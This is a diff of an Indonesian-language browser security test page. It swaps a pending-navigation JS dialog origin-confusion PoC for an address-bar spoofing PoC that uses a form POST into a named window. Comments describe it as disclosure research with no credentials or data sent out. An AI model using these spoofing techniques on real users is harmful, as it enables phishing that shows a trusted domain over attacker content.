@@ -1,82 +1,15 @@
-<!-- MEKANISME: dialog JS ditembakkan saat navigasi masih PENDING (port di-drop => commit tak pernah datang), sehingga baris judul dialog bisa menyebut host TUJUAN sementara dokumen pemiliknya masih dokumen ini. -->
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>18 — Baris origin pada dialog JS saat navigasi pending</title>
-<style>
-  *{box-sizing:border-box}
-  body{font:15px/1.55 system-ui,Segoe UI,Roboto,sans-serif;margin:0;padding:1rem;color:#111;background:#fff}
-  .p{border:2px solid #d33;border-radius:12px;padding:.9rem 1rem;max-width:720px;margin:0 auto}
-  h2{font-size:1.08rem;margin:.1rem 0 .6rem}
-  .kv{display:grid;grid-template-columns:9.5rem 1fr;gap:.28rem .7rem;font-size:.9rem}
-  .kv b{color:#555;font-weight:600}
-  code{background:#f2f2f2;padding:.08rem .32rem;border-radius:4px;word-break:break-all}
-  .vuln{color:#d33;font-weight:700}.sec{color:#0a7;font-weight:700}
-  button{font:inherit;padding:.5rem .9rem;border:1px solid #888;border-radius:9px;background:#fafafa;cursor:pointer;margin:.15rem .3rem .15rem 0}
-  button.k{background:#d33;color:#fff;border-color:#b22}
-  pre{font:12.5px/1.5 ui-monospace,Consolas,monospace;background:#0d1117;color:#c9d1d9;border-radius:9px;padding:.6rem .7rem;white-space:pre-wrap;min-height:4.5rem;margin:.7rem 0 0}
-  .n{font-size:.82rem;color:#777}
-  @media(prefers-color-scheme:dark){body{background:#161616;color:#eee}.kv b{color:#aaa}code{background:#2a2a2a}}
-</style>
-</head>
-<body>
-<div class="p">
-  <h2>18 — Baris origin pada dialog JS saat navigasi masih pending</h2>
-
-  <div class="kv">
-    <b>URL asli halaman</b><span class="sec" id="real">…</span>
-    <b>Origin asli</b><span class="sec" id="realOrigin">…</span>
-    <b>Tujuan pending</b><span><code id="dest">…</code> (port di-DROP, navigasi menggantung)</span>
-  </div>
-
-  <p style="margin:.8rem 0 .2rem">
-    <button class="k" id="vulnBtn">Jalankan: navigasi pending → alert()</button>
-    <button id="ctlBtn">KONTROL: alert() tanpa navigasi</button>
-  </p>
-
-  <p class="n" style="margin:.2rem 0 0">
-    <b>VULNERABLE:</b> baris judul dialog menyebut <code>www.google.com</code> (atau host tujuan lain) padahal
-    dokumen pemilik dialog adalah origin asli di atas.<br>
-    <b>SECURE:</b> dialog menyebut origin asli di atas, atau tidak menyebut host sama sekali
-    (mis. Firefox: “This page says”), atau dialog ditekan browser selama navigasi pending.<br>
-    <b>Baseline aman</b> = tombol KONTROL: mekanisme (navigasi pending) dihapus, host yang disebut harus sama
-    dengan origin asli. Bandingkan dua tangkapan layar itu.
-  </p>
-
-  <pre id="log"></pre>
-  <p class="n">Setelah dialog ditutup, navigasi tetap menggantung. Tutup tab atau tekan Stop untuk keluar.
-     Hanya alert(); tidak ada masukan apa pun yang diminta.</p>
-</div>
-
+<!-- 11 - jendela dibuat lewat FORM POST target   [address-bar spoofing | macOS: Dia/Arc/Chrome macOS]
+     MEKANISME : commit lewat submit form, bukan skrip: jalur berbeda di dalam engine, hasil bisa berbeda.
+     PREDIKAT  : bilah menulis https://www.google.com sementara dokumen = tulisan penyerang.
+     AMAN      : jalur form diperlakukan sama dengan jalur skrip.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>11 jendela dibuat lewat FORM POST target</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var DEST = "https://www.google.com:82/";
-function $(i){ return document.getElementById(i); }
-function log(s){ $("log").textContent += s + "\n"; }
-function ask(tag){
-  var t0 = new Date().getTime();
-  alert("DEMO PoC riset keamanan.\n\nDialog ini dibuat oleh dokumen: " + location.origin +
-        "\n\nBACA BARIS DI ATAS KOTAK INI: host apa yang disebut browser sebagai pemilik dialog?");
-  var dt = new Date().getTime() - t0;
-  log("[" + tag + "] dialog ditutup setelah " + dt + " ms");
-  log("[" + tag + "] location.href saat ini = " + location.href);
-  if (dt < 120) log("[" + tag + "] dialog tampak DITEKAN/auto-dismiss oleh browser -> catat sebagai perilaku aman/varian.");
-}
-function runVuln(){
-  log("[vuln] memulai navigasi pending ke " + DEST);
-  try { location.href = DEST; } catch (e) { log("navigasi ditolak: " + e); return; }
-  setTimeout(function(){ ask("vuln"); }, 300);
-}
-function runCtl(){
-  log("[control] tanpa navigasi pending (mekanisme dihapus)");
-  ask("control");
-}
-$("real").textContent = location.href;
-$("realOrigin").textContent = location.origin || "(file://)";
-$("dest").textContent = DEST;
-$("vulnBtn").onclick = runVuln;
-$("ctlBtn").onclick = runCtl;
+var w;o.textContent='REAL: '+location.origin;
+function race(){try{w.location.href!=='about:blank';}catch(e){w.location.href='https://www.gstatic.com/generate_204';}}
+function go(){w=window.open('https://192.0.2.1/','x');w.document.write('<h3>BUKAN google.com - '+location.origin+'</h3>');setInterval(race,0);var f=document.createElement('form');f.method='POST';f.action='https://www.google.com/';f.target='x';document.body.appendChild(f);f.submit();}
 </script>
-</body>
-</html>
